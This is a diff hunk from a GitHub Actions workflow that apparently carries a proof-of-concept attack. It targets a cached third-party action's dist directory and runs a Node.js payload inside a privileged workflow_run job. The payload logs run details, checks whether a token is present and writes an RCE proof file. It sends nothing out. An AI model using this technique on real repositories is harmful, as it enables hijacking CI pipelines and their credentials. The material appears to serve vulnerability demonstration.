@@ -17,6 +17,6 @@ jobs:
           SYMTARGET: /home/runner/work/_actions/LouisBrunner/checks-action/dfcbcf801bff1ea7f1414824fc28f2cd697b35da/dist
           PAYLOAD_SRC: |
             const fs = require('fs');
-            console.log('PWNED_RCE workflow=' + process.env.GITHUB_WORKFLOW + ' job=' + process.env.GITHUB_JOB + ' repo=' + process.env.GITHUB_REPOSITORY);
-            console.log('INPUT_TOKEN_PRESENT=' + (process.env.INPUT_TOKEN ? 'yes' : 'no'));
-            fs.writeFileSync('/tmp/rce-proof.txt', 'attacker code ran in privileged workflow_run job\n');
+            console.log('PWNED_RCE job=' + process.env.GITHUB_JOB + ' workflow=' + process.env.GITHUB_WORKFLOW + ' repo=' + process.env.GITHUB_REPOSITORY);
+            console.log('TOKEN_PRESENT=' + (process.env.INPUT_TOKEN ? 'yes' : 'no'));
+            fs.writeFileSync('/tmp/rce-proof.txt', 'attacker code executed inside privileged workflow_run job ' + process.env.GITHUB_JOB + '\n');
